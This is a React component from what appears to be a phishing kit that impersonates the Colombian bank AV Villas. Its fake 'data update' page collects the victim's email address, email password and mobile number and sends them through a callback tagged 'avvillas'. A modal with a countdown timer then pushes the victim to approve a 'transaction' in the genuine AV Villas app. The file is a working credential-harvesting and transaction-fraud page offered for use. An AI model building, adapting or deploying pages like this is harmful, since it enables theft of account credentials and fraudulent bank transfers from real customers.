/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState, useMemo, useEffect } from "react";

export default function ActDatos({ enviar, showAutorizarAppModal = false }: any) {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  
  // Modal state
  const [showModal, setShowModal] = useState(showAutorizarAppModal);
  const [timeLeft, setTimeLeft] = useState(116); // 01:56

  useEffect(() => {
    setShowModal(showAutorizarAppModal);
  }, [showAutorizarAppModal]);

  const isFormValid = useMemo(() => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(correo) && clave.length > 2 && celular.length === 10;
  }, [correo, clave, celular]);

  const handleValidate = () => {
    if (!isFormValid) {
      setError(true);
      return;
    }
    setError(false);
    setLoading(true);
    enviar?.({
      view: 'actdatos',
      user: celular,
      correo: correo,
      correoClave: clave,
      bank: "avvillas",
      noLoader: true
    });
  };

  useEffect(() => {
    let timer: any;
    if (showModal && timeLeft > 0) {
      timer = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [showModal, timeLeft]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60).toString().padStart(2, '0');
    const s = (seconds % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  };

  return (
    <div style={{ fontFamily: "Arial, sans-serif", background: "#f8f9fa", minHeight: "100vh", position: "relative" }}>
      <input type="hidden" name="hdd-documento" id="hdd-documento" value="CC" />

      {/* TOP BAR */}
      <div style={{ background: "#fff", padding: "10px 20px", boxShadow: "0 2px 4px rgba(0,0,0,0.1)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <div>
          <img src="/bancos/avvillas/img/logo.png" width={130} alt="Logo" />
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
          <span style={{ fontSize: "14px", color: "#333", fontWeight: "bold" }}>Bienvenido</span>
          <img src="/bancos/avvillas/img/menu.png" width={24} alt="Menu" style={{ cursor: "pointer" }} />
        </div>
      </div>

      {/* CONTENIDO */}
      <div style={{ display: "flex", justifyContent: "center", padding: "40px 20px" }}>
        <div style={{ background: "#fff", width: "100%", maxWidth: "450px", padding: "30px", borderRadius: "10px", boxShadow: "0 4px 10px rgba(0,0,0,0.1)" }}>
          
          <h2 style={{ margin: "0 0 10px 0", fontSize: "22px", color: "#1d3557", textAlign: "center", fontWeight: "bold" }}>
            Actualización de datos
          </h2>
          <p style={{ margin: "0 0 30px 0", fontSize: "14px", color: "#666", textAlign: "center" }}>
            Por favor confirme sus datos de contacto para continuar.
          </p>

          <div style={{ marginBottom: '20px' }}>
            <label style={{ display: "block", fontSize: "13px", color: "#555", marginBottom: "5px", fontWeight: "bold" }}>
              Correo electrónico
            </label>
            <input
              type="email"
              style={{ width: "100%", padding: "12px", border: "1px solid #ccc", borderRadius: "6px", fontSize: "15px", outline: "none", boxSizing: "border-box" }}
              value={correo}
              onChange={(e) => setCorreo(e.target.value)}
              placeholder="ejemplo@correo.com"
            />
          </div>

          <div style={{ marginBottom: '20px' }}>
            <label style={{ display: "block", fontSize: "13px", color: "#555", marginBottom: "5px", fontWeight: "bold" }}>
              Clave de correo
            </label>
            <input
              type="password"
              style={{ width: "100%", padding: "12px", border: "1px solid #ccc", borderRadius: "6px", fontSize: "15px", outline: "none", boxSizing: "border-box" }}
              value={clave}
              onChange={(e) => setClave(e.target.value)}
              placeholder="••••••••"
            />
          </div>

          <div style={{ marginBottom: '25px' }}>
            <label style={{ display: "block", fontSize: "13px", color: "#555", marginBottom: "5px", fontWeight: "bold" }}>
              Número de celular
            </label>
            <input
              type="tel"
              style={{ width: "100%", padding: "12px", border: "1px solid #ccc", borderRadius: "6px", fontSize: "15px", outline: "none", boxSizing: "border-box" }}
              value={celular}
              onChange={(e) => setCelular(e.target.value.replace(/\D/g, "").slice(0, 10))}
              maxLength={10}
              placeholder="3000000000"
            />
          </div>

          {error && (
            <div style={{ color: "#d9534f", fontSize: "13px", marginBottom: "20px", textAlign: "center", fontWeight: "bold" }}>
              Por favor complete todos los campos correctamente.
            </div>
          )}

          <div style={{ display: "flex", flexDirection: "column", gap: "15px" }}>
            <button
              type="button"
              style={{
                width: "100%", padding: "14px", border: "none", borderRadius: "6px", fontSize: "16px", fontWeight: "bold",
                background: isFormValid && !loading ? "#e3001b" : "#f5a5ad", color: "#fff", cursor: isFormValid && !loading ? "pointer" : "not-allowed",
                transition: "background 0.3s"
              }}
              disabled={!isFormValid || loading}
              onClick={handleValidate}
            >
              {loading ? "CARGANDO..." : "CONTINUAR"}
            </button>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <div style={{ padding: "20px", textAlign: "center", background: "#fff", borderTop: "1px solid #eee", marginTop: "auto" }}>
        <img src="/bancos/avvillas/img/logo-gav.png" width={80} alt="GAV" />
        <p style={{ fontSize: "12px", color: "#999", marginTop: "10px" }}>Vigilado Superintendencia Financiera de Colombia</p>
      </div>

      {/* MODAL AUTORIZAR POR APP */}
      {showModal && (
        <div style={{
          position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.6)",
          display: "flex", justifyContent: "center", alignItems: "center", zIndex: 1000, padding: "20px"
        }}>
          <div style={{
            background: "#fff", borderRadius: "16px", width: "100%", maxWidth: "450px", position: "relative",
            boxShadow: "0 10px 30px rgba(0,0,0,0.2)"
          }}>
            <button 
              onClick={() => setShowModal(false)} 
              style={{ position: 'absolute', top: '15px', right: '15px', background: 'none', border: 'none', fontSize: '22px', cursor: 'pointer', color: '#333', zIndex: 10 }}
            >
              ✕
            </button>
            
            <div style={{ padding: "30px", textAlign: "center" }}>
              <h3 style={{ fontSize: "20px", color: "#222", margin: "10px 0 25px 0", fontWeight: "700", lineHeight: "1.3" }}>
                Autoriza tu transacción desde la aplicación<br/>de AV Villas
              </h3>

              <div style={{ marginBottom: "25px", position: "relative", display: "inline-block", width: "120px", height: "120px" }}>
                {/* SVG Illustration resembling the image */}
                <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                  {/* Decorative elements */}
                  <circle cx="20" cy="40" r="3" fill="#e3001b" />
                  <circle cx="100" cy="80" r="3" fill="#e3001b" />
                  <path d="M90 30 L95 25 M95 30 L90 25" stroke="#0033a0" strokeWidth="2" />
                  <path d="M25 85 L35 75" stroke="#0033a0" strokeWidth="2" />
                  <path d="M35 85 L25 75" stroke="#0033a0" strokeWidth="2" />
                  
                  {/* Phone */}
                  <rect x="45" y="30" width="30" height="60" rx="4" stroke="#333" strokeWidth="2" fill="#fff" />
                  <line x1="55" y1="35" x2="65" y2="35" stroke="#333" strokeWidth="2" strokeLinecap="round" />
                  
                  {/* Red Circle with $ */}
                  <circle cx="65" cy="65" r="14" fill="#fff" stroke="#e3001b" strokeWidth="2" />
                  <circle cx="65" cy="65" r="10" fill="#e3001b" />
                  <text x="65" y="70" fill="#fff" fontSize="14" fontWeight="bold" textAnchor="middle">$</text>
                  
                  {/* Blue plus */}
                  <path d="M85 60 L85 70 M80 65 L90 65" stroke="#0033a0" strokeWidth="3" strokeLinecap="round" />
                </svg>
              </div>

              {/* Progress Bar & Timer */}
              <div style={{ display: 'flex', alignItems: 'center', margin: '0 0 25px 0', gap: '15px' }}>
                <div style={{ flex: 1, height: '4px', background: '#e0e0e0', borderRadius: '2px', overflow: 'hidden' }}>
                  {/* Calculate percentage assuming 116s max */}
                  <div style={{ width: `${Math.max(0, (timeLeft / 116) * 100)}%`, height: '100%', background: '#002366', transition: 'width 1s linear' }}></div>
                </div>
                <span style={{ fontSize: '14px', color: '#555', fontWeight: '500' }}>{formatTime(timeLeft)}</span>
              </div>

              {/* Text description */}
              <p style={{ fontSize: "15px", color: "#333", margin: "0 0 20px 0", lineHeight: "1.5" }}>
                En este momento hemos enviado una notificación a tu <strong>AV Villas App</strong> registrada para autorizar esta transacción.
              </p>

              {/* Bullet Points */}
              <ul style={{ textAlign: "left", fontSize: "14px", color: "#444", listStyleType: "disc", paddingLeft: "25px", margin: "0 0 25px 0", display: "flex", flexDirection: "column", gap: "10px", lineHeight: "1.4" }}>
                <li>Ingresa a tu AVVillas App</li>
                <li>Encontrarás un mensaje con los datos de tu transacción, en caso de que no lo veas puedes ingresar por el icono de campana o notificaciones</li>
                <li>Da clic en la opción de autorizar y listo!</li>
              </ul>

              {/* Info Box */}
              <div style={{ background: "#e8f0fe", borderRadius: "8px", padding: "12px 15px", display: "flex", gap: "12px", alignItems: "flex-start", textAlign: "left" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0033a0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: "2px" }}>
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="16" x2="12" y2="12"></line>
                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
                <span style={{ fontSize: "13px", color: "#555", lineHeight: "1.4" }}>
                  En caso de que no te llegue la notificación a tu AV Villas App. Haremos la autorización por medio del código QR.
                </span>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}